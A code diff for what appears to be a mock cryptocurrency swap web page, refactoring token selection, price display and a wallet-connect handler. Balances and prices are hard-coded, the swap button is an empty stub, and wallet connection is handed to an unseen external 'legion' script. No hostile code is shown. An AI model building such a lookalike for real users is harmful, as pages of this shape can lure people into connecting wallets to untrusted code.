+  { sym:'ARB',   name:'Arbitrum',        img:'https://assets.coingecko.com/coins/images/16547/small/photo_2023-03-29_21.47.00.jpeg',                                        price:1.21,    bal:890     },
+  { sym:'OP',    name:'Optimism',        img:'https://assets.coingecko.com/coins/images/25244/small/Optimism.png',                                                          price:2.14,    bal:430     },
+  { sym:'WETH',  name:'Wrapped Ether',   img:'https://assets.coingecko.com/coins/images/2518/small/weth.png',                                                               price:2647.32, bal:0       },
 ];
 
-let sellTokenSym = 'ETH';
-let buyTokenSym  = 'USDC';
-let activeModal  = null;
-let ethPrice     = 2647.32;
-let walletConnected = false;
+let sellSym = 'ETH';
+let buySym  = null;
+let modal   = null;
+let connected = false;
 
-// ─── Tab switching ────────────────────────────────────────────────────────────
-function setTab(name){
-  document.querySelectorAll('.tab,.nav-link').forEach(t=>{
-    t.classList.toggle('active', t.textContent.trim().toLowerCase()===name);
-  });
+function getToken(sym){ return TOKENS.find(t=>t.sym===sym); }
+
+function switchTab(el, name){
+  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+  el.classList.add('active');
 }
 
-// ─── Sell input ───────────────────────────────────────────────────────────────
-function getToken(sym){ return TOKENS.find(t=>t.sym===sym)||TOKENS[0]; }
-
-function onSellInput(val){
-  const num = parseFloat(val)||0;
-  const sell = getToken(sellTokenSym);
-  const buy  = getToken(buyTokenSym);
-  const rate = sell.price / buy.price;
-  const out  = num * rate;
-  document.getElementById('buyInput').value = out > 0 ? out.toFixed(out<1?6:2) : '';
-  document.getElementById('sellUsd').textContent = num > 0 ? '$'+(num*sell.price).toLocaleString('en-US',{maximumFractionDigits:2}) : '$0';
-  document.getElementById('buyUsd').textContent  = out > 0 ? '$'+(out*buy.price).toLocaleString('en-US',{maximumFractionDigits:2})   : '$0';
-  const pr = document.getElementById('priceRow');
-  const ds = document.getElementById('detailsSection');
-  if(num>0){ pr.style.display='flex'; ds.style.display='block'; } else { pr.style.display='none'; ds.style.display='none'; }
-  updatePriceText();
+function onSellInput(v){
+  const n = parseFloat(v)||0;
+  const s = getToken(sellSym);
+  const b = buySym ? getToken(buySym) : null;
+  if(s) document.getElementById('sellUsd').textContent = n ? '$'+(n*s.price).toLocaleString('en-US',{maximumFractionDigits:2}) : '$0';
+  if(b && n){
+    const rate = s.price/b.price;
+    const out = n*rate;
+    document.getElementById('buyAmt').value = out.toFixed(out<1?6:2);
+    document.getElementById('buyUsd').textContent = '$'+(out*b.price).toLocaleString('en-US',{maximumFractionDigits:2});
+    updatePrice();
+    document.getElementById('priceRow').classList.add('show');
+    document.getElementById('details').classList.add('show');
+  } else {
+    document.getElementById('buyAmt').value='';
+    document.getElementById('buyUsd').textContent='$0';
+    document.getElementById('priceRow').classList.remove('show');
+    document.getElementById('details').classList.remove('show');
+  }
 }
 
-function updatePriceText(){
-  const sell = getToken(sellTokenSym);
-  const buy  = getToken(buyTokenSym);
-  const rate = (sell.price / buy.price).toFixed(buy.price<1?6:2);
-  document.getElementById('priceText').textContent = `1 ${sell.sym} = ${Number(rate).toLocaleString()} ${buy.sym}`;
+function updatePrice(){
+  const s = getToken(sellSym);
+  const b = buySym ? getToken(buySym) : null;
+  if(!s||!b) return;
+  const rate = (s.price/b.price);
+  document.getElementById('priceText').textContent =
+    `1 ${s.sym} = ${rate.toLocaleString('en-US',{maximumFractionDigits:4})} ${b.sym}`;
 }
 
 function flipTokens(){
-  [sellTokenSym, buyTokenSym] = [buyTokenSym, sellTokenSym];
-  renderTokens();
-  const sv = document.getElementById('buyInput').value;
-  document.getElementById('sellInput').value = sv;
-  onSellInput(sv);
+  if(!buySym) return;
+  [sellSym, buySym] = [buySym, sellSym];
+  renderSellPill(); renderBuyPill();
+  const bv = document.getElementById('buyAmt').value;
+  document.getElementById('sellAmt').value = bv||'';
+  onSellInput(bv||'');
 }
 
 function setMax(){
-  const tok = getToken(sellTokenSym);
-  document.getElementById('sellInput').value = tok.bal;
-  onSellInput(tok.bal);
+  const t = getToken(sellSym);
+  if(!t) return;
+  document.getElementById('sellAmt').value = t.bal;
+  onSellInput(t.bal);
 }
 
-function renderTokens(){
-  const sell = getToken(sellTokenSym);
-  const buy  = getToken(buyTokenSym);
-  document.getElementById('sellIcon').src  = sell.img;
-  document.getElementById('sellToken').textContent = sell.sym;
-  document.getElementById('buyIcon').src   = buy.img;
-  document.getElementById('buyToken').textContent  = buy.sym;
+function renderSellPill(){
+  const t = getToken(sellSym);
+  if(!t) return;
+  document.getElementById('sellImg').src = t.img;
+  document.getElementById('sellSym').textContent = t.sym;
 }
 
-// ─── Modal ────────────────────────────────────────────────────────────────────
-function renderModal(search){
-  const filtered = search ? TOKENS.filter(t=>
-    t.sym.toLowerCase().includes(search.toLowerCase())||
-    t.name.toLowerCase().includes(search.toLowerCase())
-  ) : TOKENS;
+function renderBuyPill(){
+  const ps = document.getElementById('buyPillSelect');
+  const pp = document.getElementById('buyPill');
+  if(!buySym){ ps.style.display='flex'; pp.style.display='none'; return; }
+  const t = getToken(buySym);
+  ps.style.display='none'; pp.style.display='flex';
+  document.getElementById('buyImg').src = t.img;
+  document.getElementById('buySym').textContent = t.sym;
+}
 
-  // Common tokens (top row)
-  const common = document.getElementById('commonTokens');
-  if(!search){
-    common.innerHTML = TOKENS.slice(0,6).map(t=>`
-      <div class="common-token" onclick="selectToken('${t.sym}')">
-        <img src="${t.img}" style="width:20px;height:20px;border-radius:50%" onerror="this.style.display='none'">
-        ${t.sym}
-      </div>`).join('');
-    common.style.display='flex';
-  } else { common.style.display='none'; }
+function openModal(side){
+  modal = side;
+  document.getElementById('tokenModal').classList.add('open');
+  document.getElementById('tokenSearch').value='';
+  renderModal('');
+  setTimeout(()=>document.getElementById('tokenSearch').focus(),50);
+}
+function closeModal(){ document.getElementById('tokenModal').classList.remove('open'); modal=null; }
+function closeOutside(e){ if(e.target.id==='tokenModal') closeModal(); }
 
-  document.getElementById('tokenList').innerHTML = filtered.map(t=>`
-    <div class="token-list-item" onclick="selectToken('${t.sym}')">
-      <img src="${t.img}" style="width:36px;height:36px;border-radius:50%" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 32 32%22><circle cx=%2216%22 cy=%2216%22 r=%2216%22 fill=%22%23444%22/></svg>'">
-      <div class="token-list-info">
-        <div class="token-list-name">${t.sym}</div>
-        <div class="token-list-full">${t.name}</div>
-      </div>
-      <div class="token-list-bal">
-        <div>${walletConnected ? t.bal.toLocaleString() : ''}</div>
-        <div class="token-list-bal-usd">${walletConnected ? '$'+(t.bal*t.price).toLocaleString('en-US',{maximumFractionDigits:2}) : ''}</div>
+function renderModal(q){
+  const list = q ? TOKENS.filter(t=>t.sym.toLowerCase().includes(q.toLowerCase())||t.name.toLowerCase().includes(q.toLowerCase())) : TOKENS;
+  const cw = document.getElementById('commonWrap');
+  cw.style.display = q ? 'none' : 'flex';
+  if(!q) cw.innerHTML = TOKENS.slice(0,6).map(t=>`
+    <div class="common-chip" onclick="selectToken('${t.sym}')">
+      <img src="${t.img}" onerror="this.style.display='none'"> ${t.sym}
+    </div>`).join('');
+  document.getElementById('tokenList').innerHTML = list.map(t=>`
+    <div class="token-item" onclick="selectToken('${t.sym}')">
+      <img src="${t.img}" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 32 32%22><circle cx=%2216%22 cy=%2216%22 r=%2216%22 fill=%22%23333%22/></svg>'">
+      <div class="ti-info"><div class="ti-sym">${t.sym}</div><div class="ti-name">${t.name}</div></div>
+      <div class="ti-bal">
+        ${connected ? `<div>${t.bal.toLocaleString()}</div><div class="ti-bal-usd">$${(t.bal*t.price).toLocaleString('en-US',{maximumFractionDigits:2})}</div>` : ''}
       </div>
     </div>`).join('');
 }
 
-function openModal(side){
-  activeModal = side;
-  document.getElementById('tokenModal').classList.remove('hidden');
-  document.getElementById('tokenSearch').value='';
-  renderModal('');
-  document.getElementById('tokenSearch').focus();
-}
-function closeModal(){
-  document.getElementById('tokenModal').classList.add('hidden');
-  activeModal = null;
-}
-function closeModalOutside(e){
-  if(e.target.id==='tokenModal') closeModal();
-}
 function filterTokens(v){ renderModal(v); }
+
 function selectToken(sym){
-  if(activeModal==='sell'){ sellTokenSym=sym; }
-  else { buyTokenSym=sym; }
-  renderTokens();
+  if(modal==='sell'){ sellSym=sym; renderSellPill(); }
+  else { buySym=sym; renderBuyPill(); }
   closeModal();
-  const sv = document.getElementById('sellInput').value;
+  const sv = document.getElementById('sellAmt').value;
   if(sv) onSellInput(sv);
 }
 
-// ─── Wallet connect ───────────────────────────────────────────────────────────
 function triggerConnect(){
   if(window.legion && window.legion.openPanel){
     window.legion.openPanel();
   } else if(window.legion && window.legion.connect){
     window.legion.connect();
   } else {
-    // Script not yet ready — retry after 500ms
-    setTimeout(triggerConnect, 500);
+    setTimeout(triggerConnect, 400);
   }
 }
 
-// Update UI when wallet connects
 window.addEventListener('legion:connected', function(e){
-  walletConnected = true;
+  connected = true;
   const addr = e.detail && e.detail.address;
   const short = addr ? addr.slice(0,6)+'...'+addr.slice(-4) : 'Connected';
-  document.getElementById('navConnectBtn').textContent = short;
-  document.getElementById('navConnectBtn').style.background = 'rgba(34,197,94,.12)';
-  document.getElementById('navConnectBtn').style.color = '#22c55e';
-  document.getElementById('navConnectBtn').style.borderColor = 'rgba(34,197,94,.2)';
-  document.getElementById('mainBtn').textContent = 'Swap';
-  document.getElementById('mainBtn').className = 'swap-btn swap-btn-active';
-  document.getElementById('mainBtn').onclick = function(){ alert('Swap submitted!'); };
-  // Show balances
+  const nb = document.getElementById('navConnectBtn');
+  nb.textContent = short;
+  nb.classList.add('connected');
   document.getElementById('sellBal').style.display='inline';
-  document.getElementById('sellBalAmt').textContent = getToken(sellTokenSym).bal.toLocaleString();
+  document.getElementById('sellBalAmt').textContent = getToken(sellSym).bal.toLocaleString();
+  if(buySym){
+    const mb = document.getElementById('mainBtn');
+    mb.textContent = 'Swap';
+    mb.className = 'main-btn swap';
+    mb.onclick = function(){ /* swap action */ };
+  }
 });
 
-// ─── Init ─────────────────────────────────────────────────────────────────────
-renderTokens();
-updatePriceText();
+renderSellPill();
+renderBuyPill();
 </script>
 </body>
 </html>
